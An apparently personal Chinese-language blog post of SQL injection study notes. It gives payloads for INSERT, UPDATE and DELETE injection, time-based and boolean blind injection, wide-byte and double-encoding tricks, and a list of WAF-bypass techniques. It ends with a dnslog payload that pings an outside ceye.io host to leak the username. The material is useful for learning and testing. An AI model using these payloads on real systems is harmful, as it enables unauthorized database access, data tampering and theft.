<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="yes" name="apple-touch-fullscreen"><meta content="telephone=no,email=no" name="format-detection"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon"><link href="https://fonts.googleapis.com/css?family=Rubik" rel="stylesheet"><script src="https://use.fontawesome.com/adaf0e149c.js"></script><link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.6.0/styles/monokai_sublime.min.css"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/css/post.css"><link rel="stylesheet" href="/css/markdown-github.css"><title>zhang's blog</title><script src="/js/googleAnalytics.js"></script></head><body><div id="postContainer"><div id="postTop"><h4 id="logo">Life Is Short</h4><br><br><h2 id="postTitle">sql手工注入补充</h2><br><span aria-hidden="true" class="postTime fa fa-calendar">2019-1-6</span><br><br></div><section id="articleDiv"><p>前言:上次了解了基础的手工注入，本次继续补充手工注入方法</p><br><h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p>sql语句insert into messages (title,message,……) values (‘hello’,’123’,……);</p><br><p>在insert中输入</p><br><p>123’) #</p><br><p>123’,1) #</p><br><p>123’,1,1) #</p><br><p>123’,1,1,1) #</p><br><p>123’,1,1,1…..) #</p><br><p>猜解注入点及后面的字段</p><br><p>将显示的地方改为查询语句</p><br><h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>sql语句update users set pass = ‘123456’ where name = ‘admin’;</p><br><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>123’ and sleep(1) #</p><br><p>123” and sleep(1) #</p><br><p>123’) and sleep(1) #</p><br><p>123”) and sleep(1) #</p><br><p>应当使用时间盲注123’ where id = 1 and if(length(version())&gt;5,sleep(3),0) #</p><br><h4 id="上传图片的update注入"><a href="#上传图片的update注入" class="headerlink" title="上传图片的update注入"></a>上传图片的update注入</h4><p>hello’.jpg</p><br><p>hello’ where sleep(3)#.jpg</p><br><p>hello’ where id = 1 and sleep(3)#.jpg</p><br><p>hello’ where id = 1 and if(length(version())&gt;5,sleep(3),0)#.jpg</p><br><h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>sql语句delete from users where  id = ‘57’ and name = ‘zs’;</p><br><p>zs’ and sleep(3)#</p><br><p>如果不想真的删除一条数据，就可以使用时间延时盲注，注意if语句返回结果都是0</p><br><p>delete from users where  id = ‘57’ and name = ‘zs’ and if(length(version())&gt;5,sleep(3),0) #’;</p><br><p>如果数据足够多，就是用布尔盲注</p><br><p>delete from users where  id = ‘57’ and name = ‘qwerdfzs’ and length(version())&gt;5 #’;</p><br><h3 id="sql注入预防"><a href="#sql注入预防" class="headerlink" title="sql注入预防"></a>sql注入预防</h3><p>addslashes函数(不能预防数字型注入)</p><br><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>编码是gbk编码，utf-8没有宽字节注入</p><br><p>在注入编码参数加入%df</p><br><h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><p>对用户的字符串已经进行了转换</p><br><p>参数加入%2527</p><br><h3 id="注入工具"><a href="#注入工具" class="headerlink" title="注入工具"></a>注入工具</h3><p>sqlmap的使用(其他工具的简单使用中介绍)</p><br><h3 id="sql注入wafbypass"><a href="#sql注入wafbypass" class="headerlink" title="sql注入wafbypass"></a>sql注入wafbypass</h3><p>1.大小写混合(可能性很低)</p><br><p>eq:uNIoN sELecT 1,2,3,4</p><br><p>2.多写关键字</p><br><p>eq:UNIunionON SELselectECT 1,2,3,4</p><br><p>3.编码</p><br><p>url编码 eq:%252f%252a<em>/UNION%252f%252a </em></p><br><p>4.使用注释</p><br><p>常见注释://, – , /<strong>/, #, –+,–  -, ;，–a</strong></p><br><p>%55nION//%53ElecT 1,2,3,4</p><br><p>内联注释(只有mysql识别) eq:/<em>!UNION</em>/ /<em>!SELECT</em>/ 1,2,3</p><br><p>5.等价函数与命令</p><br><p>sleep() ==&gt;benchmark()</p><br><p>concat_ws()==&gt;group_concat()</p><br><p>mid()、substr() ==&gt; substring()</p><br><p>6.特殊字符</p><br><p>反引号  例如select <code>version()</code></p><br><p>“-+.”，select+id-1+1.from users;</p><br><p>@符号，select@^1.from users;</p><br><p>可能发挥大作用的字符:~、!、@、%、()、[]、.、-、+ 、|、%00</p><br><p>关键字拆分：‘se’+’lec’+’t’</p><br><p>!和()：’ or –+2=- -!!!’2</p><br><p>7.http参数控制</p><br><p>HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制</p><br><p>8.缓冲区溢出</p><br><p>and (select 1)=(Select 0xA1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</p><br><p>9.综合使用前面8种方法</p><br><h3 id="dnslog-windows适用"><a href="#dnslog-windows适用" class="headerlink" title="dnslog(windows适用)"></a>dnslog(windows适用)</h3><p>在<a href="http://ceye.io/profile" target="_blank" rel="noopener">http://ceye.io/profile</a> 上注册一个账号</p><br><p>payload:ping %USERNAME%.b182oj.ceye.io</p>
</section></div><script src="/js/jquery.min.js"></script><script src="/js/highlight.min.js"></script><script src="/js/start.js"></script></body></html>